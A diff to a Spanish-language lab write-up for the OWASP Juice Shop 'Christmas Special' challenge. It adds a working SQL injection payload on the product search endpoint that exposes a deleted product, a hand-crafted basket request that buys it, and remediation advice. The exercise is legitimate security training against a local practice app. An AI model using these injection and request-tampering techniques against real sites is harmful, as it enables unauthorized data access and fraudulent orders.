@@ -434,14 +434,81 @@ El desafío consiste en comprar la oferta especial de Navidad de la edición 201
 
 ### Enfoque de explotación
 
-1. Identificar el identificador (`ProductId`) del producto oculto "Christmas Special", por ejemplo revisando respuestas anteriores del endpoint `/rest/products`, el código fuente de la aplicación o referencias históricas a la promoción de 2014.
-2. Construir o interceptar una petición `POST /api/BasketItems` indicando dicho `ProductId`, aunque el producto no aparezca listado en la interfaz.
-3. Reenviar la petición y confirmar que el producto fue agregado exitosamente a la cesta pese a no estar disponible en el catálogo visible.
-4. Completar el flujo de compra para validar el desafío.
+### Enfoque de explotación
+
+1. Buscar `christmas` desde la barra de búsqueda de Juice Shop, lo cual no arroja resultados (`http://127.0.0.1:3000/#/search?q=christmas`), confirmando que el producto no está disponible en el catálogo visible.
+
+   ![Resultado vacío](images/image16.png)
+
+2. Enviar dicha petición (`GET /rest/products/search?q=`) a Repeater e inyectar en el parámetro `q` un payload que cierre la condición `LIKE` original y comente el resto de la consulta, incluyendo el filtro `AND deletedAt IS NULL` que es el que excluye a los productos dados de baja. 
+
+  A diferencia de J5, acá no se agrega un `UNION SELECT`: alcanza con truncar la consulta antes de que se aplique dicho filtro, para que devuelva cualquier producto cuyo nombre o descripción coincida con el término buscado, esté o no marcado como eliminado:
+
+  `GET /rest/products/search?q=christmas%25'))+--`
+
+  Es importante incluir el símbolo `%` antes de la comilla de cierre, ya que la consulta original arma la condición como `LIKE '%<query>%'`; sin ese `%`, la condición pasaría a exigir que el campo *termine* exactamente en el texto buscado, en lugar de *contenerlo*, lo que impide encontrar el producto (cuyo nombre real no termina en "christmas").
+
+  ![Consulta](images/image17.png)
+
+3. Al enviar la petición, la respuesta ya no viene vacía: aparece un producto con `id: 10`, `deletedAt` con una fecha (en lugar de `null`) y una descripción que confirma que se trata de la promoción buscada. Este `id` es el `ProductId` que se va a usar para agregarlo a la cesta.
+
+   ![Prodinfo](images/image18.png)
+
+   Información de la promoción obtenida (fragmento):
+
+  ```json
+  {
+    "status":"success",
+    "data":[
+      {
+        "id":10,
+        "name":"Christmas Super-Surprise-Box (2014 Edition)",
+        "description":"Contains a random selection of 10 bottles (each 500ml) of our tastiest juices and an extra fan shirt for an unbeatable price! (Seasonal special offer! Limited availability!)",
+        "price":29.99,
+        "deluxePrice":29.99,
+        "image":"undefined.jpg",
+        "createdAt":"2026-09-29 17:01:24.199 +00:00",
+        "updatedAt":"2026-09-29 17:01:24.199 +00:00",
+        "deletedAt":"2026-09-29 17:01:24.337 +00:00"
+      }
+    ]
+  }
+  ```
+
+4. Dado que el producto no está en el catálogo visible, no existe un botón "Add to Basket" para él en la interfaz. Por eso, se arma manualmente en Burp una petición `POST /api/BasketItems` con el `ProductId` obtenido y el `BasketId` de la propia cesta del usuario autenticado:
+
+  Cuerpo de la petición con el id correspondiente:
+
+  HTTP Request: `POST /api/BasketItems/`
+  Body:
+
+  ```json
+  { "ProductId":10,
+    "BasketId":"6",
+    "quantity":1
+  }
+  ```
+  ![Peticion a interceptar](images/image19.png)
+
+5. Enviar la petición y confirmar la respuesta `200 OK`, que indica que el producto fue agregado exitosamente al carrito de compras pese a no estar disponible en el catálogo visible.
+
+  ![200 ok](images/image20.png)
+
+6. Completar el flujo de compra normalmente desde la interfaz: el producto "Christmas Super-Surprise-Box (2014 Edition)" ya figura en la cesta junto a los demás productos agregados.
+
+  ![Carrito](images/image21.png)
+
+7. Finalizar el checkout. La aplicación confirma la compra y, junto con ella, la resolución del desafío "Christmas Special".
+
+  ![Compra finalizada](images/image22.png)
 
 ### Recomendaciones
 
-Algunas recomendaciones para la corrección de dicha vulnerabilidad podría incluir...
+La corrección de la causa raíz de esta vulnerabilidad es la misma que en J5, ya que se trata en el fondo de la misma inyección SQL sobre el buscador de productos: reemplazar la construcción de la consulta por sentencias parametrizadas, de forma que el parámetro `q` no pueda alterar la cláusula `WHERE` ni comentar el filtro `deletedAt IS NULL`. Sin embargo, este desafío también expone un problema adicional y distinto, más cercano al desafío de J6; aun si la inyección SQL se corrigiera, el endpoint `POST /api/BasketItems` sigue aceptando cualquier `ProductId` sin validar del lado servidor que el producto esté efectivamente disponible para la venta (por ejemplo, verificando que su `deletedAt` sea `null`), lo cual constituye una falla de control de acceso a nivel de negocio independiente de la inyección. 
+
+Por eso, además de sanear la búsqueda, es necesario que el endpoint de agregar productos a la cesta valide explícitamente la disponibilidad del producto antes de aceptar la operación, y no solo su existencia por `id` en la base de datos. 
+
+La diferencia con J4 es más de fondo: allí el problema es que el servidor confía en un campo (`role`) que el cliente no debería poder fijar en absoluto, mientras que acá el `ProductId` sí es un campo legítimo del lado del cliente. En este caso, el defecto es que el servidor no aplica sobre ese valor una regla de negocio (disponibilidad del producto) que sí debería controlar.
 
 ---
 </div>
